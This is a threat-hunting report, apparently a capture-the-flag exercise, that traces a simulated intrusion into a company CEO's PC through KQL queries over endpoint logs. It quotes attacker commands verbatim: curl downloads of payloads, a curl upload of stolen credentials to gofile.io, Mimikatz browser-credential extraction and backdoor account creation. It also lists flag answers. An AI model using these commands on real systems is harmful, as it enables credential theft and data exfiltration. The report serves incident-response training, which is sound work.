# THE AZUKI BREACH SAGA - Part 3: Bridge Takeover

## Executive Summary

This report documents the findings from Part 3 of the threat hunting investigation conducted on Azuki Import/Export Trading Co. Two days after the file server breach (November 22), threat actors returned on November 25 and pivoted from the compromised IT workstation to the CEO's administrative PC (azuki-adminpc). The attacker deployed sophisticated tools including Meterpreter (Metasploit C2 beacon) and a custom implant named "silentlynx.exe"; directly linking this intrusion to the JADE SPIDER threat actor.

The investigation revealed extensive credential theft targeting browser-saved passwords, KeePass password databases, and plaintext password files. The attacker exfiltrated 8 archives containing financial records, banking information, tax documents, business contracts, and credentials to an anonymous file sharing service (gofile.io).

---

## Scenario Overview

### Incident Brief

| Field | Detail |
|-------|--------|
| Company | Azuki Import/Export Trading Co. (梓貿易株式会社) |
| Situation | Two days after the file server breach, threat actors returned with sophisticated tools and pivoted to the CEO's administrative PC, deploying persistent backdoors and exfiltrating sensitive business data |
| Compromised Systems | azuki-sl (beachhead), azuki-fileserver01 (file server), azuki-adminpc (CEO PC) |
| Evidence Available | Microsoft Defender for Endpoint logs (via Azure Log Analytics) |

### Investigation Scope

| Parameter | Value |
|-----------|-------|
| Time Period | November 24 - December 6, 2025 |
| Active Attack Period | November 25, 2025, 4:06 AM - 6:10 AM |
| Target Device | azuki-adminpc |
| Data Source | Microsoft Defender for Endpoint logs (Azure Log Analytics) |

> **Note:** The investigation scope for Part 3 begins November 24, 2025. The active attack period was confined to November 25, 2025, with the attacker completing their operations within approximately 2 hours.

### Supporting Documents

- [Attack Timeline](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/chronological-timeline.md) - Chronological breakdown of attacker activity
- [Indicators of Compromise](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/indicators-of-compromise.md) - Complete IOC list with detection signatures

### Connection to Previous Parts

| Part | Date | Target | Key Activity |
|------|------|--------|--------------|
| Part 1 | November 19, 2025 | azuki-sl | Initial access, credential theft, persistence |
| Part 2 | November 22, 2025 | azuki-fileserver01 | File server compromise, data exfiltration |
| Part 3 | November 25, 2025 | azuki-adminpc | CEO PC compromise, extensive credential theft |

---

## Findings

### Flag 1: Lateral Movement - Source System

**Objective:** Identify the source IP address for lateral movement to the admin PC.

**Query Used:**
```kql
DeviceLogonEvents
| where TimeGenerated >= datetime(2025-11-24)
| where RemoteIP == "10.1.0.204" or RemoteDeviceName contains "azuki-sl"
| where ActionType == "LogonSuccess"
| order by TimeGenerated asc
| project TimeGenerated, DeviceName, AccountName, RemoteIP, RemoteDeviceName, LogonType
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:06:41 AM |
| Source IP | 10.1.0.204 |
| Source Device | azuki-sl |
| Target Device | azuki-adminpc |
| Account Used | yuki.tanaka |
| Logon Type | Network → RemoteInteractive |

**Analysis:**

The lateral movement to the CEO's admin PC originated from IP address 10.1.0.204, which is the IT admin workstation (azuki-sl) compromised during Part 1. This confirms that azuki-sl continues to serve as the attacker's primary beachhead for pivoting to other systems within the network. The attacker accessed the admin PC multiple times throughout the morning (4:06 AM, 4:31 AM, 5:21 AM, 6:06 AM), suggesting phased operations to avoid detection or accommodate large data transfers.

**MITRE ATT&CK Reference:**
- Lateral Movement (TA0008)
- Remote Services: Remote Desktop Protocol (T1021.001)

**Flag Answer:** `10.1.0.204`

---

### Flag 2: Lateral Movement - Compromised Credentials

**Objective:** Identify the compromised account used for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 1.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:06:41 AM |
| Account | yuki.tanaka |
| Target Device | azuki-adminpc |
| Source Device | azuki-sl (10.1.0.204) |

**Analysis:**

The attacker used the `yuki.tanaka` account for lateral movement to the CEO's admin PC. This is a new compromised account not seen in Parts 1 or 2, where the attacker primarily used `kenji.sato` and `fileadmin`. The credentials were likely obtained from the `IT-Admin-Passwords.csv` file discovered on the file server during Part 2.

**Compromised Accounts Across All Parts:**

| Part | Account | Used For |
|------|---------|----------|
| Part 1 | kenji.sato | Initial access to azuki-sl |
| Part 1 | support | Backdoor account created |
| Part 2 | fileadmin | Lateral movement to file server |
| Part 3 | yuki.tanaka | Lateral movement to CEO admin PC |

**MITRE ATT&CK Reference:**
- Valid Accounts (T1078)

**Flag Answer:** `yuki.tanaka`

---

### Flag 3: Lateral Movement - Target Device

**Objective:** Identify the target device for lateral movement.

**Reference:** This finding was derived from the same query results as Flag 1.

**Finding:**

| Field | Value |
|-------|-------|
| Target Device | azuki-adminpc |
| Target IP | 10.1.0.188 |
| Account Used | yuki.tanaka |

**Analysis:**

The attacker moved laterally to `azuki-adminpc`, which based on the naming convention is the CEO's administrative workstation. This represents a significant escalation in the attack, as executive workstations typically contain highly sensitive business information including strategic documents, financial data, confidential communications, and password databases.

**Compromised Systems Across All Parts:**

| Part | Device | Role |
|------|--------|------|
| Part 1 | azuki-sl | IT admin workstation (beachhead) |
| Part 2 | azuki-fileserver01 | File server |
| Part 3 | azuki-adminpc | CEO/Admin PC |

**MITRE ATT&CK Reference:**
- Remote Services: Remote Desktop Protocol (T1021.001)
- System Information Discovery (T1082)

**Flag Answer:** `azuki-adminpc`

---

### Flag 4: Execution - Payload Hosting Service

**Objective:** Identify the file hosting service used to stage malware.

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where RemoteUrl != ""
| where InitiatingProcessCommandLine has_any ("curl", "wget", "url", "powershell")
| order by TimeGenerated asc
| project TimeGenerated, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:12 AM |
| Hosting Service | litter.catbox.moe |
| Remote IP | 108.181.20.36 |
| Download Command | `curl.exe -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` |

**Analysis:**

The attacker used `litter.catbox.moe`, an anonymous file hosting service, to stage malware for download. This is a different service from Part 2 (file.io), demonstrating the attacker's practice of rotating infrastructure between operations. The downloaded file was disguised as a Windows update (`KB5044273-x64.7z`), a common masquerading technique.

**MITRE ATT&CK Reference:**
- Stage Capabilities: Upload Malware (T1608.001)
- Ingress Tool Transfer (T1105)

**Flag Answer:** `litter.catbox.moe`

---

### Flag 5: Execution - Malware Download Command

**Objective:** Identify the command used to download the malicious archive.

**Reference:** This finding was derived from the same query results as Flag 4.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:12 AM |
| Command | `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z` |
| Account | yuki.tanaka |

**Analysis:**

The attacker used `curl.exe` to download a malicious archive disguised as a Windows security update. The `-L` flag follows redirects, and `-o` specifies the output path. The filename `KB5044273-x64.7z` mimics legitimate Windows update naming conventions to avoid suspicion.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- Masquerading: Match Legitimate Name or Location (T1036.005)

**Flag Answer:** `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`

---

### Flag 6: Execution - Archive Extraction Command

**Objective:** Identify the command used to extract the password-protected archive.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("7z", "extract", "rar")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:21:32 AM |
| Command | `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y` |
| Account | yuki.tanaka |

**Analysis:**

The attacker used `7z.exe` to extract the password-protected archive. The command-line flags include `-p` for the password (redacted), `-o` for output directory, and `-y` to suppress prompts. Password-protected archives prevent security tools from inspecting contents during download.

**MITRE ATT&CK Reference:**
- Deobfuscate/Decode Files or Information (T1140)
- Ingress Tool Transfer (T1105)

**Flag Answer:** `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`

---

### Flag 7: Persistence - C2 Implant

**Objective:** Identify the C2 beacon filename.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where FolderPath contains "cache"
| where FileName endswith ".exe"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
```

**Finding:**

| Timestamp | Filename | Purpose |
|-----------|----------|---------|
| Nov 25, 4:21:33 AM | m.exe | Mimikatz (credential theft) |
| Nov 25, 4:21:33 AM | meterpreter.exe | Metasploit C2 beacon |
| Nov 25, 4:21:33 AM | silentlynx.exe | Custom JADE SPIDER implant |
| Nov 25, 5:58:27 AM | PsExec64.exe | Sysinternals remote execution |

**Analysis:**

The archive contained multiple offensive security tools, with `meterpreter.exe` being the primary C2 beacon. The presence of `silentlynx.exe` is particularly notable as "SilentLynx" is a known alias for JADE SPIDER, confirming threat actor attribution.

**MITRE ATT&CK Reference:**
- Command and Scripting Interpreter (T1059)
- Command and Control (TA0011)

**Flag Answer:** `meterpreter.exe`

---

### Flag 8: Persistence - Named Pipe

**Objective:** Identify the named pipe created by the C2 implant.

**Query Used:**
```kql
DeviceEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ActionType contains "Pipe"
| extend PipeName = parse_json(AdditionalFields).PipeName
| order by TimeGenerated asc
| project TimeGenerated, ActionType, PipeName, InitiatingProcessFileName, InitiatingProcessAccountName
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:24:35 AM |
| Named Pipe | \Device\NamedPipe\msf-pipe-5902 |
| Process | meterpreter.exe |

**Analysis:**

The Meterpreter implant created a named pipe `\Device\NamedPipe\msf-pipe-5902`. The `msf-pipe-*` naming pattern is a well-known behavioral indicator for Metasploit-based implants.

**MITRE ATT&CK Reference:**
- Internal Proxy (T1090.001)
- Inter-Process Communication (T1559)

**Flag Answer:** `\Device\NamedPipe\msf-pipe-5902`

---

### Flag 9: Credential Access - Decoded Account Creation

**Objective:** Identify the decoded Base64 command used for account creation.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where FileName == "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "FromBase64", "-e ")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, ProcessCommandLine
```

**Finding:**

| Timestamp | Encoded Command | Decoded Command |
|-----------|-----------------|-----------------|
| Nov 25, 4:51:08 AM | `bgBlAHQAIAB1AHMAZQByAC...` | `net user yuki.tanaka2 B@ckd00r2024! /add` |
| Nov 25, 4:51:23 AM | `bgBlAHQAIABsAG8AYwBhAG...` | `net localgroup Administrators yuki.tanaka2 /add` |

**Analysis:**

The attacker used Base64-encoded PowerShell commands to obfuscate account creation activity. When decoded, the commands reveal the creation of a backdoor account named `yuki.tanaka2` with the password `B@ckd00r2024!`.

**MITRE ATT&CK Reference:**
- Obfuscated Files or Information (T1027)
- Create Account: Local Account (T1136.001)

**Flag Answer:** `net user yuki.tanaka2 B@ckd00r2024! /add`

---

### Flag 10: Persistence - Backdoor Account

**Objective:** Identify the backdoor account name.

**Reference:** This finding was derived from the decoded Base64 commands in Flag 9.

**Finding:**

| Field | Value |
|-------|-------|
| Backdoor Account | yuki.tanaka2 |
| Password | B@ckd00r2024! |
| Privilege | Added to Administrators group |

**Analysis:**

The attacker created `yuki.tanaka2` to mimic the legitimate `yuki.tanaka` account, making it harder to detect during casual review.

**MITRE ATT&CK Reference:**
- Create Account: Local Account (T1136.001)
- Account Manipulation (T1098)

**Flag Answer:** `yuki.tanaka2`

---

### Flag 11: Persistence - Decoded Privilege Escalation Command

**Objective:** Identify the decoded Base64 command for privilege escalation.

**Reference:** This finding was derived from the same query results as Flag 9.

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:51:23 AM |
| Decoded Command | `net localgroup Administrators yuki.tanaka2 /add` |

**Analysis:**

The attacker elevated the backdoor account to the Administrators group, ensuring full administrative control over the system.

**MITRE ATT&CK Reference:**
- Valid Accounts: Local Accounts (T1078.003)
- Obfuscated Files or Information (T1027)

**Flag Answer:** `net localgroup Administrators yuki.tanaka2 /add`

---

### Flag 12: Discovery - Session Enumeration

**Objective:** Identify the command used to enumerate RDP sessions.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("quser", "qwinsta", "query user", "query session")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Timestamp | Command | Purpose |
|-----------|---------|---------|
| Nov 25, 4:08:58 AM | `"qwinsta.exe"` | Query RDP sessions |
| Nov 25, 4:09:07 AM | `"quser.exe"` | Query logged-on users |

**Analysis:**

The attacker executed `qwinsta.exe` and `quser.exe` to enumerate active sessions and identify if their activity might be noticed.

**MITRE ATT&CK Reference:**
- System Owner/User Discovery (T1033)

**Flag Answer:** `qwinsta`

---

### Flag 13: Discovery - Domain Trust Enumeration

**Objective:** Identify the command used to enumerate domain trusts.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("nltest", "domain_trusts", "Get-ADTrust", "trustedDomain")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:09:25 AM |
| Command | `"nltest.exe" /domain_trusts /all_trusts` |

**Analysis:**

The attacker used `nltest.exe` to enumerate all domain trust relationships, revealing potential paths for lateral movement to other domains.

**MITRE ATT&CK Reference:**
- Domain Trust Discovery (T1482)

**Flag Answer:** `"nltest.exe" /domain_trusts /all_trusts`

---

### Flag 14: Discovery - Network Connection Enumeration

**Objective:** Identify the command used to enumerate network connections.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("netstat")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:10:07 AM |
| Command | `"NETSTAT.EXE" -ano` |

**Analysis:**

The attacker used `netstat -ano` to enumerate active network connections and their associated process IDs.

**MITRE ATT&CK Reference:**
- System Network Connections Discovery (T1049)

**Flag Answer:** `"NETSTAT.EXE" -ano`

---

### Flag 15: Discovery - Password Database Search

**Objective:** Identify the command used to search for password databases.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where ProcessCommandLine has_any ("dir", "Get-ChildItem", "where", "kdbx", "kdb", "psafe", ".1pif")
| where ProcessCommandLine has_any ("/s", "-Recurse", "/r")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:13:45 AM |
| Command | `where /r C:\Users *.kdbx` |

**Analysis:**

The attacker searched recursively for KeePass password database files (`.kdbx`) across all user directories.

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)

**Flag Answer:** `where /r C:\Users *.kdbx`

---

### Flag 16: Discovery - Credential File

**Objective:** Identify the discovered password file.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= datetime(2025-11-24)
| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
| where ProcessCommandLine has_any (".txt", ".lnk")
| order by TimeGenerated asc 
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessCommandLine, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:15:52 AM |
| Filename | OLD-Passwords.txt |
| Path | C:\Users\yuki.tanaka\Desktop\OLD-Passwords.txt |

**Analysis:**

The attacker discovered a plaintext password file on the user's desktop. This represents a critical security hygiene failure.

**MITRE ATT&CK Reference:**
- Unsecured Credentials: Credentials In Files (T1552.001)

**Flag Answer:** `OLD-Passwords.txt`

---

### Flag 17: Collection - Data Staging Directory

**Objective:** Identify the data staging directory.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ActionType == "FileCreated"
| where FileName endswith ".tar.gz" or FileName endswith ".zip" or FileName endswith ".7z"
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName
```

**Finding:**

| Field | Value |
|-------|-------|
| Staging Directory | C:\ProgramData\Microsoft\Crypto\staging |

**Archives Staged:**

| Filename | Category |
|----------|----------|
| Tax-Supporting-Docs-2024.zip | Tax records |
| All-Contracts-2022.zip | Business contracts |
| All-Contracts-2023.zip | Business contracts |
| credentials.tar.gz | Credentials |
| quickbooks-data.tar.gz | Financial/Accounting |
| banking-records.tar.gz | Banking information |
| tax-documents.tar.gz | Tax records |
| contracts-data.tar.gz | Business contracts |

**Analysis:**

The attacker used `C:\ProgramData\Microsoft\Crypto\staging` to stage stolen data, mimicking legitimate Windows cryptographic service directories.

**MITRE ATT&CK Reference:**
- Data Staged: Local Data Staging (T1074.001)

**Flag Answer:** `C:\ProgramData\Microsoft\Crypto\staging`

---

### Flag 18: Collection - Automated Data Collection Command

**Objective:** Identify the command used to copy banking documents.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ProcessCommandLine has_any ("robocopy", "xcopy", "copy")
| where ProcessCommandLine has_any ("bank", "financial", "staging")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 4:37:03 AM |
| Command | `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP` |

**Analysis:**

The attacker used `Robocopy.exe` with flags optimized for speed (`/R:1 /W:1`) and stealth (`/NP`) to copy banking documents.

**MITRE ATT&CK Reference:**
- Automated Collection (T1119)
- Data from Local System (T1005)

**Flag Answer:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`

---

### Flag 19: Collection - Exfiltration Volume

**Objective:** Identify the total number of archives created.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where ActionType == "FileCreated"
| where FolderPath contains "staging"
| where FileName endswith ".tar.gz" or FileName endswith ".zip"
| summarize Count = count(), Archives = make_set(FileName)
```

**Finding:**

| Field | Value |
|-------|-------|
| Total Archives | 8 |

**MITRE ATT&CK Reference:**
- Archive Collected Data: Archive via Utility (T1560.001)

**Flag Answer:** `8`

---

### Flag 20: Credential Access - Credential Theft Tool Download

**Objective:** Identify the command used to download the credential theft tool.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine contains "catbox"
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:55:34 AM |
| Command | `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z` |

**Analysis:**

The attacker downloaded a second archive containing Mimikatz approximately 1.5 hours after the initial malware deployment.

**MITRE ATT&CK Reference:**
- Ingress Tool Transfer (T1105)
- OS Credential Dumping (T1003)

**Flag Answer:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`

---

### Flag 21: Credential Access - Browser Credential Theft

**Objective:** Identify the command used for browser credential theft.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine has_any ("m.exe", "mimikatz")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Timestamp | November 25, 2025, 5:55:54 AM |
| Command | `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit` |

**Analysis:**

The attacker used Mimikatz with the `dpapi::chrome` module to extract saved credentials from Google Chrome.

**MITRE ATT&CK Reference:**
- Credentials from Password Stores: Credentials from Web Browsers (T1555.003)

**Flag Answer:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`

---

### Flag 22: Exfiltration - Data Upload Command

**Objective:** Identify the command used to exfiltrate the first archive.

**Query Used:**
```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where ProcessCommandLine has_any ("curl", "certutil", "Invoke-WebRequest", "wget")
| where ProcessCommandLine has_any ("http://", "https://", "upload", "POST")
| order by TimeGenerated asc
| project TimeGenerated, AccountName, FileName, ProcessCommandLine
```

**Finding:**

| Timestamp | Archive | Destination |
|-----------|---------|-------------|
| 4:41:51 AM | credentials.tar.gz | gofile.io |
| 4:42:04 AM | quickbooks-data.tar.gz | gofile.io |
| 4:42:13 AM | banking-records.tar.gz | gofile.io |
| 4:42:23 AM | tax-documents.tar.gz | gofile.io |
| 4:42:33 AM | contracts-data.tar.gz | gofile.io |
| 4:49:19 AM | chrome-credentials.tar.gz | gofile.io |
| 5:56:50 AM | chrome-session-theft.tar.gz | gofile.io |

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service (T1567)

**Flag Answer:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`

---

### Flag 23: Exfiltration - Cloud Storage Service

**Objective:** Identify the exfiltration service domain.

**Reference:** This finding was derived from the same query results as Flag 22.

**Finding:**

| Field | Value |
|-------|-------|
| Service | gofile.io |
| API Endpoint | https://store1.gofile.io/uploadFile |

**Analysis:**

The attacker used `gofile.io`, an anonymous file sharing service, demonstrating continued rotation of exfiltration infrastructure across parts.

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)

**Flag Answer:** `gofile.io`

---

### Flag 24: Exfiltration - Destination Server

**Objective:** Identify the exfiltration server IP address.

**Query Used:**
```kql
DeviceNetworkEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:21:33Z')
| where RemoteUrl has "gofile"
| order by TimeGenerated asc
| project TimeGenerated, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Remote IP | 45.112.123.227 |
| Remote URL | store1.gofile.io |

**MITRE ATT&CK Reference:**
- Exfiltration Over Web Service: Exfiltration to Cloud Storage (T1567.002)

**Flag Answer:** `45.112.123.227`

---

### Flag 25: Credential Access - Master Password Extraction

**Objective:** Identify the file containing the extracted master password.

**Query Used:**
```kql
DeviceFileEvents
| where DeviceName == "azuki-adminpc"
| where TimeGenerated >= todatetime('2025-11-25T04:06:41Z')
| where InitiatingProcessCommandLine has_any ("password", "master", "key", "secret", "cred")
| order by TimeGenerated asc
| project TimeGenerated, ActionType, FileName, FolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
```

**Finding:**

| Field | Value |
|-------|-------|
| Master Password File | KeePass-Master-Password.txt |
| KeePass Database | Azuki-Passwords.kdbx |
| Archived Into | credentials.tar.gz |

**Analysis:**

The attacker discovered and exfiltrated `KeePass-Master-Password.txt`, which contains the master password for the KeePass password database. This represents a catastrophic security failure - storing a password manager's master password in a plaintext file alongside the database completely defeats the purpose of using a password manager.

With both the KeePass database and its master password, the attacker now has access to all credentials stored within, potentially including:
- Corporate application credentials
- Network device passwords
- Cloud service accounts
- Backup server credentials
- Personal accounts

**MITRE ATT&CK Reference:**
- Credentials from Password Stores: Password Managers (T1555.005)

**Flag Answer:** `KeePass-Master-Password.txt`

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|--------|-----------|-----|----------|
| Lateral Movement | Remote Services: Remote Desktop Protocol | T1021.001 | RDP from azuki-sl to azuki-adminpc |
| Lateral Movement | Valid Accounts | T1078 | yuki.tanaka credentials |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | Base64-encoded commands |
| Execution | User Execution | T1204 | 7z.exe archive extraction |
| Persistence | Create Account: Local Account | T1136.001 | yuki.tanaka2 backdoor |
| Defense Evasion | Obfuscated Files or Information | T1027 | Base64-encoded PowerShell |
| Defense Evasion | Masquerading | T1036.005 | KB5044273-x64.7z (fake update) |
| Defense Evasion | Deobfuscate/Decode Files | T1140 | Password-protected archives |
| Credential Access | Credentials from Password Stores: Web Browsers | T1555.003 | Chrome credential theft |
| Credential Access | Credentials from Password Stores: Password Managers | T1555.005 | KeePass database theft |
| Credential Access | Unsecured Credentials: Credentials In Files | T1552.001 | OLD-Passwords.txt, KeePass-Master-Password.txt |
| Discovery | System Owner/User Discovery | T1033 | qwinsta, quser, whoami |
| Discovery | Domain Trust Discovery | T1482 | nltest /domain_trusts |
| Discovery | System Network Connections Discovery | T1049 | netstat -ano |
| Collection | Data Staged: Local Data Staging | T1074.001 | C:\ProgramData\Microsoft\Crypto\staging |
| Collection | Automated Collection | T1119 | Robocopy.exe scripts |
| Collection | Archive Collected Data | T1560.001 | tar.exe compression |
| Exfiltration | Exfiltration Over Web Service | T1567 | curl.exe to gofile.io |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | Meterpreter over HTTPS |
| Command and Control | Internal Proxy | T1090.001 | Named pipe msf-pipe-5902 |

---

## Recommendations

### Immediate Actions

1. **Disable compromised accounts** - Immediately disable yuki.tanaka and remove the yuki.tanaka2 backdoor account.

2. **Isolate affected systems** - Quarantine azuki-adminpc for forensic analysis.

3. **Reset all credentials** - The KeePass database was exfiltrated with its master password. All credentials stored within must be considered compromised and rotated.

4. **Block malicious infrastructure:**
   - 45.112.123.227 (gofile.io upload server)
   - 108.181.20.36 (litter.catbox.moe)
   - Block gofile.io and catbox.moe at the network perimeter

5. **Remove persistence mechanisms:**
   - Delete backdoor account: yuki.tanaka2
   - Remove malicious files from C:\Windows\Temp\cache\
   - Clear staging directory: C:\ProgramData\Microsoft\Crypto\staging

### Long-term Improvements

1. **Password management policy** - Never store master passwords in plaintext files. Implement proper secrets management.

2. **Remove old password files** - Audit all systems for plaintext password files and remove them.

3. **Browser credential protection** - Consider enterprise password managers instead of browser-saved passwords.

4. **Endpoint detection** - Alert on Meterpreter named pipe patterns (msf-pipe-*).

5. **Outbound traffic monitoring** - Alert on uploads to anonymous file sharing services.

6. **Base64 command detection** - Alert on PowerShell executions with -EncodedCommand parameter.

---

## References

- [JADE SPIDER Threat Intel Report](https://www.notion.so/JADE-SPIDER-2b0cf57416ff80f38f39f75f670b09e2)
- [Additional Details - By Threat Hunt Organizor](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/part-3-bridge-takeover/docs/additional-details.md)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender for Endpoint Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/)
- [Summary - The AZUKI BREACH SAGA](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/blob/main/README.md)
- [Part 1 Investigation Report](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-1-port-of-entry)
- [Part 2 Cargo Hold](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-2-cargo-hold)
- [Part 4 Dead in the Water](https://github.com/moradiya-neel/threat-hunt-azuki-breach-saga/tree/main/part-4-dead-in-the-water)
